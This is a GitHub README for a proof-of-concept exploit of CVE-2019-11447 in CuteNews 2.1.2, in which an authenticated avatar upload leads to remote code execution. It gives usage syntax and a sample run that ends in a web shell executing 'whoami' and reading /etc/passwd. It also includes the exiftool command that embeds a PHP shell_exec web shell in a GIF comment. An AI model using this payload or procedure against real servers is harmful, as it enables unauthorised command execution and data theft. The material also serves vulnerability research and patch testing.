# sadnews

CuteNews 2.1.2 - CVE-2019-11447 Proof-Of-Concept

POC by CRFSlick, discovered by AkkuS <Özkan Mustafa Akkuş>

> An issue was discovered in CutePHP CuteNews 2.1.2. An attacker can infiltrate the server 
through the avatar upload process in the profile area via the avatar_file field to
index.php?mod=main&opt=personal. There is no effective control of $imgsize in
/core/modules/dashboard.php. The header content of a file can be changed and the control
can be bypassed for code execution. (An attacker can use the GIF header for this.)

## Usage
```bash
Usage:
	CVE-2019-1144.py <username> <password> <base uri / login page>
Example:
	CVE-2019-1144.py admin p4ssw0rd http://192.168.1.19/CuteNews/index.php
```

```bash
┌──(slick㉿kali)-[~/CVE-2019-11447-POC]
└─$ python3 CVE-2019-11447.py admin p4ssw0rd http://192.168.1.19/CuteNews/index.php
-.-. --- --- .-..    .... ....- -..- --- .-.    -... .- -. -. . .-.
[*] Detected version 'CuteNews 2.1.2'
[*] Grabbing session cookie
[*] Logging in as admin:p4ssw0rd
[+] Login Success!
[*] Grabbing __signature_key and __signature_dsi needed for pofile update request
[+] __signature_key: 45ad06a9fc89f75e7ef046a11079c33d-admin
[+] __signature_dsi: 71e41d6500f2dc51d0606f64539f84b1
[*] Uploading evil avatar... Done!
[*] Validating that the file was uploaded... Yup!
[+] http://192.168.1.19/CuteNews/uploads/avatar_admin_5629.php?cmd=<cmd>
[*] Looks like everything went smoothly, lets see if we have RCE!
[*] Keep in mind that this shell is limited, no STDERR

$> whoami
www-data

$> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Evil GIF

The evil gif was grabbed from the internet and then modified using exiftool in order to insert the needed PHP
```bash
┌──(slick㉿kali)-[~/CVE-2019-11447-POC]
└─$ exiftool -Comment='<?php echo "'"\n\ndGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ==\n\n\n"'"; echo shell_exec($_GET["'"cmd"'"]); echo "'"\n\ndGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU=\n\n"'";?>' sad.gif
```

Exiftool will show the metadata of the image where you will find the placed PHP code inside of the comment
```bash
┌──(slick㉿kali)-[~/CVE-2019-11447-POC]
└─$ exiftool sad.gif
ExifTool Version Number         : 12.05
File Name                       : sad.gif
...
Comment                         : <?php echo "\n\ndGhpc3dlYnNoZWxsb3V0cHV0c3R...
```

## Sources
+ https://nvd.nist.gov/vuln/detail/CVE-2019-11447
+ http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html



## Disclaimer
This project is intended for educational purposes only and cannot be used for law violation or personal gain.
The author of this project is not responsible for any possible harm caused by the materials.
